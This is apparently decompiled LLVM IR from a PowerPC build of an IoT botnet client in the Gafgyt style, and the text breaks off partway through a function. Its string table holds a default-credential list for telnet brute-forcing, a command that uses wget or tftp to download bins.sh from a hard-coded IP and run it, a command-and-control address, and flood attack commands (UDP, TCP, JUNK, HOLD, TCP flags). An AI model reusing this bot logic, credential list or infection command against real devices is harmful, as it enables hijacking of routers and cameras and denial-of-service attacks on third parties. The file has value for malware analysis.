source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208015669
@global_var_10020000.2 = global i32 0
@global_var_1001f9f0.4 = global i32 0
@global_var_1001f9fc.5 = local_unnamed_addr global i32* @global_var_1001f9f0.4
@global_var_1001fe08.8 = global i32 0
@global_var_1001f9f4.9 = global i32 0
@global_var_1000ddfc.10 = constant [8 x i8] c"POWERPC\00"
@global_var_1000de40.15 = constant [8 x i8] c"UNKNOWN\00"
@global_var_1001fe20.16 = global i32 0
@global_var_1001fe24.17 = local_unnamed_addr global i32 0
@global_var_1001fe28.18 = local_unnamed_addr global i32 0
@global_var_1001fa3c.19 = local_unnamed_addr global i32 4095
@global_var_1001fa38.20 = local_unnamed_addr global i32 362436
@global_var_1000de48.21 = constant [7 x i8] c"(null)\00"
@global_var_1001fdb0.22 = local_unnamed_addr global i32 0
@global_var_10001544.23 = constant i32 1207987473
@global_var_10001590.24 = constant i32 939589631
@global_var_100015e4.25 = constant i32 1207959608
@global_var_1000de50.26 = constant [8 x i8] c"/bin/sh\00"
@global_var_1000de58.27 = constant [3 x i8] c"sh\00"
@global_var_1000de5c.28 = constant [3 x i8] c"-c\00"
@global_var_10001644.29 = constant [3 x i8] c"8`\00"
@global_var_10001674.30 = constant i32 1207959576
@global_var_1000de60.31 = constant i32 -1
@global_var_1000e260.32 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1000e270.33 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_10001e6c.34 = constant i32 939524096
@global_var_10001eb8.35 = constant i32 939524097
@global_var_100020ac.36 = constant i32 939524126
@global_var_1001fd98.37 = local_unnamed_addr global i32 0
@global_var_1000e27c.38 = constant [5 x i8] c"PING\00"
@global_var_100021a8.39 = constant i32 939524126
@global_var_100023e8.40 = constant i32 939524098
@global_var_100025f0.41 = constant i32 939524097
@global_var_1001fda0.42 = global i32 0
@global_var_1001fda4.43 = local_unnamed_addr global i32 0
@global_var_1001fdc0.44 = local_unnamed_addr global i32 0
@global_var_10002968.45 = constant i32 939524096
@global_var_1000e284.46 = constant [6 x i8] c":>%$#\00"
@global_var_1000e28c.47 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_1001fdb8.48 = local_unnamed_addr global i32 0
@global_var_100036a4.49 = constant i32 939524096
@global_var_100037b8.50 = constant i32 939524096
@global_var_1000e2bc.51 = constant i32 -43536
@global_var_1000dc7c.53 = constant [5 x i8] c"root\00"
@global_var_1000dc84.54 = constant [8 x i8] c"support\00"
@global_var_1000dc90.55 = constant [6 x i8] c"admin\00"
@global_var_1000dc98.56 = constant [9 x i8] c"smcadmin\00"
@global_var_1000dca4.57 = constant [5 x i8] c"1234\00"
@global_var_1000dcac.58 = constant [6 x i8] c"12345\00"
@global_var_1000dcb4.59 = constant [7 x i8] c"123456\00"
@global_var_1000dcbc.60 = constant [9 x i8] c"password\00"
@global_var_1000dcc8.61 = constant [5 x i8] c"pass\00"
@global_var_1000dcd0.62 = constant [9 x i8] c"dreambox\00"
@global_var_1000dcdc.70 = constant [14 x i8] c"sh || shell\0D\0A\00"
@global_var_1000dcec.71 = constant [79 x i8] c"cd /var/ || cd /tmp/ || cd /var/run( || cd /var/tmp/ || cd /dev/ || cd /mnt/\0D\0A\00"
@global_var_1000dd3c.72 = constant [125 x i8] c"busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\0D\0A\00"
@global_var_1000ddbc.73 = constant [61 x i8] c"busybox echo || echo nameserver 8.8.8.8 > /etc/resolv.conf\0D\0A\00"
@global_var_1000e598.74 = constant i32 33554944
@global_var_1000e898.75 = constant i32 1
@global_var_1001fb10.78 = global i32 34603008
@global_var_10004fd0.84 = constant [3 x i8] c"8`\00"
@global_var_1000510c.85 = constant i32 1207984093
@global_var_1000e2e0.86 = constant [4 x i8] c"all\00"
@global_var_1000e2e4.87 = constant i32 738197504
@global_var_1000e2e8.88 = constant [4 x i8] c"syn\00"
@global_var_1000e2ec.89 = constant [4 x i8] c"rst\00"
@global_var_1000e2f0.90 = constant [4 x i8] c"fin\00"
@global_var_1000e2f4.91 = constant [4 x i8] c"ack\00"
@global_var_1000e2f8.92 = constant [4 x i8] c"psh\00"
@global_var_1000e2fc.93 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_10005828.94 = constant [3 x i8] c"8`\00"
@global_var_10005b88.95 = constant [3 x i8] c"8`\00"
@global_var_10005cdc.96 = constant i32 1207960216
@global_var_100060fc.97 = constant [3 x i8] c"8`\00"
@global_var_10006250.98 = constant i32 1207960392
@global_var_1000e310.99 = constant [6 x i8] c"PONG!\00"
@global_var_10006658.100 = constant i32 1207962288
@global_var_1000e318.101 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_1000e324.102 = constant [10 x i8] c"My IP: %s\00"
@global_var_100066bc.103 = constant i32 1207962188
@global_var_1000e330.104 = constant [5 x i8] c"HOLD\00"
@global_var_100067e8.105 = constant [3 x i8] c"8`\00"
@global_var_100067f0.106 = constant [3 x i8] c"8`\00"
@global_var_10006848.107 = constant [3 x i8] c"8`\00"
@global_var_1000e338.108 = constant [5 x i8] c"JUNK\00"
@global_var_10006978.109 = constant [3 x i8] c"8`\00"
@global_var_10006980.110 = constant [3 x i8] c"8`\00"
@global_var_100069d8.111 = constant [3 x i8] c"8`\00"
@global_var_1000e340.112 = constant [4 x i8] c"UDP\00"
@global_var_10006c48.113 = constant [3 x i8] c"8`\00"
@global_var_10006c50.114 = constant [3 x i8] c"8`\00"
@global_var_10006cb4.115 = constant [3 x i8] c"8`\00"
@global_var_1000e344.116 = constant [4 x i8] c"TCP\00"
@global_var_10006f34.117 = constant [3 x i8] c"8`\00"
@global_var_10006f3c.118 = constant [3 x i8] c"8`\00"
@global_var_10006fa4.119 = constant [3 x i8] c"8`\00"
@global_var_1000e348.120 = constant [9 x i8] c"KILLATTK\00"
@global_var_1000e354.121 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_1001fd50.122 = local_unnamed_addr global i32 -1
@global_var_1000dc68.123 = constant [19 x i8] c"185.158.113.30:123\00"
@global_var_1001fd4c.124 = global [19 x i8]* @global_var_1000dc68.123
@global_var_100071dc.125 = constant i32 939524873
@global_var_1000e360.126 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1000e368.127 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1000e378.128 = constant [11 x i8] c"\0900000000\09\00"
@global_var_100074e0.129 = constant i32 939524096
@global_var_1001fda8.130 = global i32 0
@global_var_10007534.131 = constant i32 1207959564
@global_var_100075a4.132 = constant [3 x i8] c"8`\00"
@global_var_1000e384.133 = constant [6 x i8] c"-bash\00"
@global_var_100075fc.134 = constant i32 939524097
@global_var_1000e38c.135 = constant [46 x i8] c"%sWelcome to the botnet [%s:%s:%d cores] :)%s\00"
@global_var_100076b8.138 = constant i32 1207963049
@global_var_100076e4.139 = constant [3 x i8] c"8`\00"
@global_var_10007718.140 = constant i32 1207963649
@global_var_1000e3cc.141 = constant i32 788529152
@global_var_10007728.142 = constant [3 x i8] c"8`\00"
@global_var_10007734.143 = constant i32 1207959556
@global_var_1000e3d0.144 = constant [38 x i8] c"%sCould not connect to commServer!%s\0A\00"
@global_var_10007768.145 = constant [3 x i8] c"8`\00"
@global_var_1000e3f8.146 = constant [17 x i8] c"BUILD [%s:%s:%d]\00"
@global_var_100077b4.147 = constant i32 939524096
@global_var_1000e40c.148 = constant [8 x i8] c"SCANNER\00"
@global_var_1000e414.149 = constant [17 x i8] c"SCANNER ON | OFF\00"
@global_var_10007b04.150 = constant i32 1207961156
@global_var_1000e428.151 = constant [4 x i8] c"OFF\00"
@global_var_1001fdbc.152 = local_unnamed_addr global i32 0
@global_var_1000e42c.153 = constant [17 x i8] c"SCANNER STOPPED!\00"
@global_var_1000e440.154 = constant [3 x i8] c"ON\00"
@global_var_1000e444.155 = constant [28 x i8] c"attempting to start scanner\00"
@global_var_1000e460.156 = constant [17 x i8] c"SCANNER STARTED!\00"
@global_var_10007c20.157 = constant [3 x i8] c"8`\00"
@global_var_1000e474.158 = constant [5 x i8] c"PONG\00"
@global_var_10007c68.159 = constant i32 1207960744
@global_var_1000e47c.160 = constant [4 x i8] c"DUP\00"
@global_var_1000e480.161 = constant [3 x i8] c"SH\00"
@global_var_1000e484.162 = constant [8 x i8] c"%s 2>&1\00"
@0 = constant i32 1912602624
@global_var_1000e490.164 = constant [3 x i8] c"%s\00"
@global_var_10007f54.165 = constant [3 x i8] c"8`\00"
@global_var_10007f84.166 = constant [3 x i8] c"8`\00"
@global_var_10007f8c.167 = constant i32 939524097
@global_var_1000e494.168 = constant i32 536870912
@global_var_100081ec.169 = constant i32 1207959564
@global_var_10008794.170 = constant i32 939524118
@global_var_1001fd68 = external local_unnamed_addr global i32
@global_var_1001fdec.171 = global i32 0
@global_var_1000bd98.172 = constant [3 x i8] c"8`\00"
@global_var_10008a20.173 = constant [3 x i8] c" c\00"
@global_var_10008a3c.174 = constant [3 x i8] c" c\00"
@global_var_1000ea98.175 = constant i32 0
@global_var_1001fa40.176 = global i32 0
@global_var_1001fa58.177 = global i32 0
@global_var_1001fd88.178 = local_unnamed_addr global i32* bitcast (i16* @global_var_1001fa70.76 to i32*)
@global_var_10008d88.179 = constant i32 1207961092
@global_var_10008eb4.180 = constant i32 1207960768
@global_var_1000eacc.181 = constant i32 269488136
@global_var_1000eab0.182 = constant [6 x i8] c"(nil)\00"
@global_var_1000eab8.183 = constant [7 x i8] c"(null)\00"
@global_var_1000eac0.184 = constant i32 721431808
@global_var_10009310.185 = constant i32 939524096
@global_var_1000eb4c.186 = constant i32 65793
@global_var_1000eb34.187 = constant i32 524293
@global_var_1000eb2c.188 = constant [8 x i8] c" +0-#'I\00"
@global_var_1000ead4.189 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1000eb14.190 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1000eb08.191 = constant i32 67343
@global_var_1000eb07.192 = constant i32 50331911
@global_var_1000eaf8.193 = constant i32 268435461
@global_var_1000eae8.194 = constant i32 520093701
@global_var_10009ddc.195 = constant i32 939589631
@global_var_10009e90.196 = constant i32 939524118
@global_var_1000eb68.197 = constant [8 x i8] c"Success\00"
@global_var_1000eb58.198 = constant [15 x i8] c"Unknown error \00"
@global_var_1001fdcc.199 = global i32 0
@global_var_10025e20.200 = global i32 0
@global_var_1000aacc.201 = constant i32 939524118
@global_var_1000ab54.202 = constant i32 939524118
@global_var_10025e48.203 = global i32 0
@global_var_10025e30.204 = global i32 0
@global_var_1001fd90 = external global i32
@global_var_1000f944.206 = constant i32 0
@global_var_1001fddc.207 = local_unnamed_addr global i32 0
@global_var_10025ec8.208 = global i32 0
@global_var_1000adb0.209 = constant i32 939524108
@global_var_1000ae48.210 = constant [3 x i8] c"8`\00"
@global_var_1000b050.211 = constant i32 1207959640
@global_var_1000b08c.212 = constant i32 1207959580
@global_var_1001fc68.213 = global i32 0
@global_var_1001fc80 = external global i32
@global_var_1001fca0.215 = global i32 -1726662223
@global_var_1001fc88.216 = local_unnamed_addr global i32* @global_var_1001fca0.215
@global_var_1001fc84.217 = global i32* @global_var_1001fca0.215
@global_var_1000f6c4.218 = constant i32 0
@global_var_1000b3a4.219 = constant i32 939524118
@global_var_1000b7b8.220 = constant i32 939524130
@global_var_1001fd1c.221 = global i32 0
@global_var_1001fdd0.222 = local_unnamed_addr global i32 0
@global_var_1000b84c.223 = constant i32 1207960761
@global_var_1001fdd8.224 = local_unnamed_addr global i32 0
@global_var_1000f6ec.225 = constant i32 -15148
@global_var_1000bbb0.226 = constant i32 939524118
@global_var_1001f9e4.227 = global i32 -1
@global_var_1001fde0.228 = local_unnamed_addr global i32 0
@global_var_1001fde4.229 = local_unnamed_addr global i32 0
@global_var_1000f948.230 = constant [10 x i8] c"/dev/null\00"
@global_var_1001fde8.231 = local_unnamed_addr global i32 0
@global_var_1001fdd4.232 = local_unnamed_addr global i32 0
@global_var_1001fd94.233 = local_unnamed_addr global i32* @global_var_1000f944.206
@global_var_1000c0b0.234 = constant i32 939524096
@global_var_1001fe00.236 = local_unnamed_addr global i32 0
@global_var_1000c4e0.237 = constant i32 939524180
@global_var_1000c7fc.238 = constant i32 939524105
@global_var_1000f980.239 = constant [4 x i8] c"inf\00"
@global_var_1000f983.241 = constant i32 4804166
@global_var_1000f990.242 = constant i32 771763200
@global_var_1001fd34.243 = global i32 0
@global_var_1000d5d8.244 = constant i32 939524129
@global_var_1001fdf4.245 = local_unnamed_addr global i32 0
@global_var_1000d64c.246 = constant [3 x i8] c"8`\00"
@global_var_1000d684.247 = constant i32 939524129
@global_var_1001fdf8.248 = local_unnamed_addr global i32 0
@global_var_1001fdfc.249 = local_unnamed_addr global i32 0
@global_var_1000d9a4.250 = constant i32 939524171
@global_var_1000dba0.251 = constant i32 939589631
@global_var_1001f9e8.252 = global i32 0
@global_var_1001fe04.3 = local_unnamed_addr global i8 0
@global_var_1001fa70.76 = global i16 288
@global_var_1001fac0.77 = global i16 272
@1 = internal constant [6 x i8] c"\1B[33m\00"
@global_var_1000e3bc.136 = constant i8* getelementptr inbounds ([6 x i8], [6 x i8]* @1, i32 0, i32 0)
@2 = internal constant [6 x i8] c"\1B[0m\0A\00"
@global_var_1000e3c4.137 = constant i8* getelementptr inbounds ([6 x i8], [6 x i8]* @2, i32 0, i32 0)
@global_var_1000e48c.163 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1001fe04.3, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001f9fc.5 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001f9fc.5 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001f9fc.5 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1001fe04.3, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1001fe04.3, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1001f9f4.9, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1001f9f4.9 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268465500, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268491844, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @getProperBinary() local_unnamed_addr {
entry:
  %v0_10000250 = load i32, i32* @r3, align 4
  ret i32 %v0_10000250
}

define i32 @getBuild(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_1000ddfc.10 to i32)
}

define i32 @getCoresAmount() local_unnamed_addr {
entry:
  store i32 268436120, i32* @lr, align 4
  %v1_10000294 = call i32 @sysconf(i32 84)
  ret i32 %v1_10000294
}

define i32 @getEndianness() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([8 x i8]* @global_var_1000de40.15 to i32)
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1001fe20.16, align 4
  %v1_100003e4 = add i32 %arg1, -1640531527
  store i32 %v1_100003e4, i32* @global_var_1001fe24.17, align 4
  %v1_100003fc = add i32 %arg1, 1013904242
  store i32 %v1_100003fc, i32* @global_var_1001fe28.18, align 4
  br label %dec_label_pc_10000418

dec_label_pc_10000418:                            ; preds = %entry, %dec_label_pc_10000418
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_10000480, %dec_label_pc_10000418 ]
  %v1_10000420 = mul i32 %storemerge12, 4
  %v2_10000430 = add i32 %v1_10000420, add (i32 ptrtoint (i32* @global_var_1001fe20.16 to i32), i32 -12)
  %v1_10000434 = inttoptr i32 %v2_10000430 to i32*
  %v2_10000434 = load i32, i32* %v1_10000434, align 4
  %v2_1000044c = add i32 %v1_10000420, add (i32 ptrtoint (i32* @global_var_1001fe20.16 to i32), i32 -8)
  %v1_10000450 = inttoptr i32 %v2_1000044c to i32*
  %v2_10000450 = load i32, i32* %v1_10000450, align 4
  %v2_10000454 = xor i32 %storemerge12, -1640531527
  %v2_1000045c = xor i32 %v2_10000454, %v2_10000434
  %v1_10000464 = xor i32 %v2_1000045c, %v2_10000450
  %v2_10000474 = add i32 %v1_10000420, ptrtoint (i32* @global_var_1001fe20.16 to i32)
  %v2_10000478 = inttoptr i32 %v2_10000474 to i32*
  store i32 %v1_10000464, i32* %v2_10000478, align 4
  %v1_10000480 = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_10000480, 4096
  br i1 %tmp7, label %dec_label_pc_10000418, label %dec_label_pc_10000494

dec_label_pc_10000494:                            ; preds = %dec_label_pc_10000418
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10000420, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000418, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_100004cc = load i32, i32* @global_var_1001fa3c.19, align 4
  %v1_100004d0 = add i32 %v3_100004cc, 1
  %v1_100004d4 = urem i32 %v1_100004d0, 4096
  store i32 %v1_100004d4, i32* @global_var_1001fa3c.19, align 4
  %v1_100004f0 = mul nuw nsw i32 %v1_100004d4, 4
  %v2_100004f4 = add i32 %v1_100004f0, ptrtoint (i32* @global_var_1001fe20.16 to i32)
  %v1_100004f8 = inttoptr i32 %v2_100004f4 to i32*
  %v2_100004f8 = load i32, i32* %v1_100004f8, align 4
  %v6_1000051c = udiv i32 %v2_100004f8, 228675
  %v2_10000520 = mul i32 %v2_100004f8, 18782
  %v3_10000530 = load i32, i32* @global_var_1001fa38.20, align 4
  %v2_1000053c = add i32 %v3_10000530, %v2_10000520
  %v3_1000053c = icmp ult i32 %v2_1000053c, %v3_10000530
  %v4_10000540 = zext i1 %v3_1000053c to i32
  %v5_10000540 = add nuw nsw i32 %v4_10000540, %v6_1000051c
  store i32 %v5_10000540, i32* %r10.global-to-local, align 4
  %v2_10000570 = add i32 %v5_10000540, %v2_1000053c
  %v2_10000584 = icmp ult i32 %v2_10000570, %v5_10000540
  br i1 %v2_10000584, label %dec_label_pc_1000058c, label %dec_label_pc_100005ac

dec_label_pc_1000058c:                            ; preds = %entry
  %v1_10000590 = add i32 %v2_10000570, 1
  %v1_100005a0 = add nuw nsw i32 %v5_10000540, 1
  br label %dec_label_pc_100005ac

dec_label_pc_100005ac:                            ; preds = %entry, %dec_label_pc_1000058c
  %storemerge = phi i32 [ %v1_100005a0, %dec_label_pc_1000058c ], [ %v5_10000540, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_10000590, %dec_label_pc_1000058c ], [ %v2_10000570, %entry ]
  store i32 %storemerge, i32* @global_var_1001fa38.20, align 4
  store i32 %v1_100004d4, i32* %r10.global-to-local, align 4
  %v2_100005bc = sub i32 -2, %stack_var_-36.0
  store i32 %v2_100005bc, i32* %v1_100004f8, align 4
  %v0_100005dc = load i32, i32* %r10.global-to-local, align 4
  %v1_100005dc = mul i32 %v0_100005dc, 4
  %v2_100005e0 = add i32 %v1_100005dc, ptrtoint (i32* @global_var_1001fe20.16 to i32)
  %v1_100005e4 = inttoptr i32 %v2_100005e0 to i32*
  %v2_100005e4 = load i32, i32* %v1_100005e4, align 4
  ret i32 %v2_100005e4

; uselistorder directives
  uselistorder i32 %v5_10000540, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_10000530, { 1, 0 }
  uselistorder i32 %v2_100004f8, { 1, 0 }
  uselistorder i32 %v1_100004d4, { 2, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* @global_var_1001fe20.16, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001fe20.16 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_100005ac, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10000620 = call i32 @__GI_strlen()
  store i32 %v0_10000620, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000644

dec_label_pc_10000638:                            ; preds = %dec_label_pc_10000644
  %v1_1000063c = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_10000644

dec_label_pc_10000644:                            ; preds = %entry, %dec_label_pc_10000638
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_1000063c, %dec_label_pc_10000638 ]
  %v2_10000650 = add i32 %stack_var_-36.0, %arg1
  %v3_10000650 = inttoptr i32 %v2_10000650 to i8*
  %v3_10000654 = load i8, i8* %v3_10000650, align 1
  %v4_10000654 = zext i8 %v3_10000654 to i32
  store i32 %v4_10000654, i32* %r3.global-to-local, align 4
  %v3_10000664 = call i32 @isspace(i32 %v4_10000654, i32 %v2_10000650)
  store i32 %v3_10000664, i32* %r3.global-to-local, align 4
  %v3_1000066c = icmp eq i32 %v3_10000664, 0
  br i1 %v3_1000066c, label %dec_label_pc_10000684.preheader, label %dec_label_pc_10000638

dec_label_pc_10000684.preheader:                  ; preds = %dec_label_pc_10000644
  %v1_1000062c = add i32 %v0_10000620, -1
  %v2_1000068c7 = icmp slt i32 %v1_1000062c, %stack_var_-36.0
  br i1 %v2_1000068c7, label %dec_label_pc_10000710.preheader, label %dec_label_pc_10000694

dec_label_pc_10000678:                            ; preds = %dec_label_pc_10000694
  %v1_1000067c = add i32 %stack_var_-40.010, -1
  %v2_1000068c = icmp slt i32 %v1_1000067c, %stack_var_-36.0
  br i1 %v2_1000068c, label %dec_label_pc_10000710.preheader, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %dec_label_pc_10000684.preheader, %dec_label_pc_10000678
  %stack_var_-40.010 = phi i32 [ %v1_1000067c, %dec_label_pc_10000678 ], [ %v1_1000062c, %dec_label_pc_10000684.preheader ]
  %v2_100006a0 = add i32 %stack_var_-40.010, %arg1
  %v3_100006a0 = inttoptr i32 %v2_100006a0 to i8*
  %v3_100006a4 = load i8, i8* %v3_100006a0, align 1
  %v4_100006a4 = zext i8 %v3_100006a4 to i32
  store i32 %v4_100006a4, i32* %r3.global-to-local, align 4
  %v3_100006b4 = call i32 @isspace(i32 %v4_100006a4, i32 %v2_100006a0)
  store i32 %v3_100006b4, i32* %r3.global-to-local, align 4
  %v3_100006bc = icmp eq i32 %v3_100006b4, 0
  br i1 %v3_100006bc, label %dec_label_pc_10000710.preheader, label %dec_label_pc_10000678

dec_label_pc_10000710.preheader:                  ; preds = %dec_label_pc_10000678, %dec_label_pc_10000694, %dec_label_pc_10000684.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_1000062c, %dec_label_pc_10000684.preheader ], [ %v1_1000067c, %dec_label_pc_10000678 ], [ %stack_var_-40.010, %dec_label_pc_10000694 ]
  %v3_100007183 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100007183, label %dec_label_pc_10000720, label %dec_label_pc_100006d0

dec_label_pc_100006d0:                            ; preds = %dec_label_pc_10000710.preheader, %dec_label_pc_100006d0
  %v2_100007346 = phi i32 [ %v2_10000734, %dec_label_pc_100006d0 ], [ %arg1, %dec_label_pc_10000710.preheader ]
  %storemerge15 = phi i32 [ %v1_10000708, %dec_label_pc_100006d0 ], [ %stack_var_-36.0, %dec_label_pc_10000710.preheader ]
  %v2_100006f4 = add i32 %storemerge15, %arg1
  %v1_100006f8 = inttoptr i32 %v2_100006f4 to i8*
  %v2_100006f8 = load i8, i8* %v1_100006f8, align 1
  %v3_10000700 = inttoptr i32 %v2_100007346 to i8*
  store i8 %v2_100006f8, i8* %v3_10000700, align 1
  %v1_10000708 = add i32 %storemerge15, 1
  %v3_10000718 = icmp sgt i32 %v1_10000708, %stack_var_-40.0.lcssa
  %v2_10000728 = sub i32 %v1_10000708, %stack_var_-36.0
  %v2_10000734 = add i32 %v2_10000728, %arg1
  br i1 %v3_10000718, label %dec_label_pc_10000720, label %dec_label_pc_100006d0

dec_label_pc_10000720:                            ; preds = %dec_label_pc_100006d0, %dec_label_pc_10000710.preheader
  %v2_10000734.lcssa = phi i32 [ %arg1, %dec_label_pc_10000710.preheader ], [ %v2_10000734, %dec_label_pc_100006d0 ]
  %v3_1000073c = inttoptr i32 %v2_10000734.lcssa to i8*
  store i8 0, i8* %v3_1000073c, align 1
  %v0_10000754 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10000754

; uselistorder directives
  uselistorder i32 %v1_10000708, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000062c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 1, 5, 2, 6, 0 }
  uselistorder i32 (i32, i32)* @isspace, { 1, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_100006d0, { 1, 0 }
  uselistorder label %dec_label_pc_10000710.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000694, { 1, 0 }
  uselistorder label %dec_label_pc_10000644, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
